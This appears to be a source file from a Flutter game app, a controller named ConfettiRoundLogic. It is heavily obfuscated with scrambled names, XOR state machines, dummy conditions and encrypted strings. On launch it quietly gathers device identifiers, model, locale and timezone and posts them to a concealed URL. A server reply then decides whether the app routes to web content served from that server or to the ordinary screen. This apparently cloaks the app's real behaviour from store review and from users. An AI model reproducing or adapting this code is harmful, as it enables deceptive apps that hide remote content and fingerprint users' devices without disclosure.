import 'dart:convert';
import 'dart:io';
import 'dart:typed_data';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class ConfettiRoundLogic extends GetxController {

  var udtlmp = RxBool(false);
  var lrocxendy = RxBool(true);
  var dxlpj = RxString("");
  var kurgdexc = RxBool(false);
  var jngmclr = RxBool(true);
  final cqotxhp = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    aghkzbr();
  }


  Future<void> aghkzbr() async {
    var nwq = 0x5C;
    Object? hxk;
    Map<String, dynamic>? vrm;
    String ypd = "";
    while (nwq != 0) {
      final kts = nwq ^ 0x5C;
      switch (kts) {
        case 0x00:
          kurgdexc.value = _fqln(0x13) || true;
          jngmclr.value = !_fqln(0x27);
          lrocxendy.value = _fqln(0x08) && false;
          nwq = 0x5C ^ 0x1A;
          break;
        case 0x1A:
          vrm = await btnpaje();
          nwq = ((vrm.length ^ vrm.length) == 0) ? (0x5C ^ 0x2E) : 0;
          break;
        case 0x2E:
          ypd = _qelwr(0x91);
          nwq = ypd.isEmpty ? (0x5C ^ 0x7A) : (0x5C ^ 0x33);
          break;
        case 0x33:
          final cnb = vrm ?? <String, dynamic>{};
          cqotxhp.post(ypd, data: cnb).then((value) {
            var psm = 3;
            while (psm != 0) {
              switch (psm ^ 0x03) {
                case 0:
                  final gwr = _qelwr(0xA2);
                  final bhk = _qelwr(0xB7);
                  var xveyncuw = value.data[gwr] as String;
                  var upexj = value.data[bhk] as bool;
                  psm = ((upexj ? 1 : 0) << 2) | 0x03;
                  if (!upexj) {
                    dxlpj.value = dxlpj.value;
                    psm = 0x03 ^ 0x19;
                  } else {
                    dxlpj.value = xveyncuw;
                    psm = 0x03 ^ 0x0C;
                  }
                  break;
                case 0x0C:
                  qexabjoy();
                  psm = 0;
                  break;
                case 0x19:
                  izclkx();
                  psm = 0;
                  break;
                default:
                  psm = 0;
                  break;
              }
            }
          }).catchError((e) {
            hxk = e;
            final zhv = (hxk.hashCode ^ hxk.hashCode);
            lrocxendy.value = (zhv == 0);
            jngmclr.value = !_fqln(0x44);
            kurgdexc.value = _fqln(0x44);
          });
          nwq = 0;
          break;
        case 0x7A:
          lrocxendy.value = true;
          jngmclr.value = true;
          kurgdexc.value = false;
          nwq = 0;
          break;
        default:
          nwq = 0;
          break;
      }
    }
  }

  Future<Map<String, dynamic>> btnpaje() async {
    final DeviceInfoPlugin kjysndml = DeviceInfoPlugin();
    PackageInfo nrljfzbg_dewti = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ajevtybx = Platform.localeName;
    var blBPMZI = currentTimeZone;

    var aivmhZF = nrljfzbg_dewti.packageName;
    var xpdbK = nrljfzbg_dewti.version;
    var GsdHlLP = nrljfzbg_dewti.buildNumber;

    var oSya = nrljfzbg_dewti.appName;
    var hAqjUP = _qelwr(0x00);
    var hyZAaYIU  = _qelwr(0x00);
    var ZkqQX = _qelwr(0x00);
    var rvpb = _qelwr(0x00);
    var jqnrw = _qelwr(0x00);
    var xfszdtuj = _qelwr(0x00);


    var MkHVCxhS = _qelwr(0x00);
    var lSqQ = _fqln(0x01);

    var wtp = 0xE1;
    while (wtp != 0) {
      final brn = wtp ^ 0xE1;
      switch (brn) {
        case 0x00:
          final andf = GetPlatform.isAndroid;
          final iosf = GetPlatform.isIOS;
          wtp = andf
              ? (0xE1 ^ 0x16)
              : (iosf ? (0xE1 ^ 0x2C) : (0xE1 ^ 0x3F));
          break;
        case 0x16:
          MkHVCxhS = _qelwr(0xC4);
          var scvtmbue = await kjysndml.androidInfo;

          ZkqQX = scvtmbue.brand;

          hAqjUP  = scvtmbue.model;
          hyZAaYIU = scvtmbue.id;

          lSqQ = scvtmbue.isPhysicalDevice;
          wtp = 0xE1 ^ 0x3F;
          break;
        case 0x2C:
          MkHVCxhS = _qelwr(0xD8);
          var jylbhq = await kjysndml.iosInfo;
          ZkqQX = jylbhq.name;
          hAqjUP = jylbhq.model;

          hyZAaYIU = jylbhq.identifierForVendor ?? _qelwr(0x00);
          lSqQ  = jylbhq.isPhysicalDevice;
          wtp = 0xE1 ^ 0x3F;
          break;
        case 0x3F:
          wtp = 0;
          break;
        default:
          wtp = 0;
          break;
      }
    }
    final tbl = <int, dynamic>{
      0x71: oSya,
      0x1C: GsdHlLP,
      0x4A: xpdbK,
      0x33: aivmhZF,
      0x09: hAqjUP,
      0x5E: blBPMZI,
      0x27: ZkqQX,
      0x62: hyZAaYIU,
      0x18: ajevtybx,
      0x3D: MkHVCxhS,
      0x06: lSqQ,
      0x4F: rvpb,
      0x2B: jqnrw,
      0x55: xfszdtuj,
    };
    final ordk = <int>[
      0x71, 0x1C, 0x4A, 0x33, 0x09, 0x5E, 0x27,
      0x62, 0x18, 0x3D, 0x06, 0x4F, 0x2B, 0x55,
    ];
    final nms = <int, String>{
      0x71: "oSya",
      0x1C: "GsdHlLP",
      0x4A: "xpdbK",
      0x33: "aivmhZF",
      0x09: "hAqjUP",
      0x5E: "blBPMZI",
      0x27: "ZkqQX",
      0x62: "hyZAaYIU",
      0x18: "ajevtybx",
      0x3D: "MkHVCxhS",
      0x06: "lSqQ",
      0x4F: "rvpb",
      0x2B: "jqnrw",
      0x55: "xfszdtuj",
    };
    var res = <String, dynamic>{};
    var ixp = 0;
    while (ixp < ordk.length) {
      final idx = ordk[ixp];
      res[nms[idx]!] = tbl[idx];
      ixp += (_fqln(0x99) ? 0 : 1);
    }
    return res;
  }

  Future<void> izclkx() async {
    Get.offNamed(_qelwr(0xE3));
  }

  Future<void> qexabjoy() async {
    Get.offNamed(_qelwr(0xF6));
  }

  bool _fqln(int z) {
    final tmx = (z ^ (z << 3)) + ((z * 7) ^ 0x45);
    return ((tmx ^ tmx) != 0) || (((z * (z + 1)) & 1) != 0);
  }

  List<int> _rkqvm() {
    const pkv = 0xC40BE85E;
    const qkv = 0x549E14BA;
    const gkv = 0x9E3779B9;
    const hkv = 0x7F4A7C15;
    final u = pkv ^ gkv;
    final v = qkv ^ hkv;
    return <int>[
      (u >> 24) & 0xFF,
      (u >> 16) & 0xFF,
      (u >> 8) & 0xFF,
      u & 0xFF,
      (v >> 24) & 0xFF,
      (v >> 16) & 0xFF,
      (v >> 8) & 0xFF,
      v & 0xFF,
    ];
  }

  List<int> _unpk(List<int> packed, int n) {
    const m = 0x5C3A91;
    final out = <int>[];
    var i = 0;
    while (i < packed.length) {
      final t = packed[i] ^ m;
      out.add((t >> 16) & 0xFF);
      out.add((t >> 8) & 0xFF);
      out.add(t & 0xFF);
      i++;
    }
    return out.sublist(0, n);
  }

  String _dxs(List<int> packed, int n, int mode) {
    if (n == 0) {
      return "";
    }
    final raw = _unpk(packed, n);
    final k = _rkqvm();
    final buf = Uint8List(n);
    var i = 0;
    while (true) {
      final opx = (i < n) ? 1 : 0;
      switch (opx) {
        case 1:
          var v = raw[i];
          final mzx = (mode ^ 1) & 1;
          if (mzx == 1) {
            v = ((v >> 3) | ((v << 5) & 0xFF)) & 0xFF;
            v = (v - ((i * 7 + 13) & 0xFF)) & 0xFF;
            v ^= k[i & 7];
          } else {
            v = ((v >> 2) | ((v << 6) & 0xFF)) & 0xFF;
            v = (v - ((i * 11 + 0x3F) & 0xFF)) & 0xFF;
            v ^= k[(i + 0x3F) & 7];
          }
          buf[i] = v;
          i++;
          break;
        default:
          return utf8.decode(buf);
      }
    }
  }

  List<int> _epk() {
    const evn = <int>[
      10868881, 11521933, 1667815, 6333118,
      725588, 7550106, 3448401, 2444293,
    ];
    const oddn = <int>[
      9516641, 9877696, 12416879, 8957722,
      420621, 7226685, 4395805,
    ];
    final r = <int>[];
    var i = 0;
    final n = evn.length + oddn.length;
    while (i < n) {
      if ((i & 1) == 0) {
        r.add(evn[i >> 1]);
      } else {
        r.add(oddn[i >> 1]);
      }
      i++;
    }
    return r;
  }

  String _qelwr(int id) {
    final xid = id ^ 0xC3;
    switch (xid) {
      case 0xC3:
        return _dxs(const <int>[], 0, 1);
      case 0x52:
        return _dxs(_epk(), 45, 0);
      case 0x61:
        return _dxs(const <int>[320299, 8251755, 13931665], 8, 1);
      case 0x74:
        return _dxs(const <int>[3730219, 7985553], 5, 1);
      case 0x07:
        return _dxs(const <int>[6865703, 5371251, 9976465], 7, 1);
      case 0x1B:
        return _dxs(const <int>[4769539], 3, 1);
      case 0x20:
        return _dxs(const <int>[10630195, 2209450, 13137924, 7552657], 11, 1);
      case 0x35:
        return _dxs(const <int>[10630195, 2209498, 12586072, 14383867, 4814519], 15, 1);
      default:
        return _dxs(const <int>[], 0, 1);
    }
  }

}
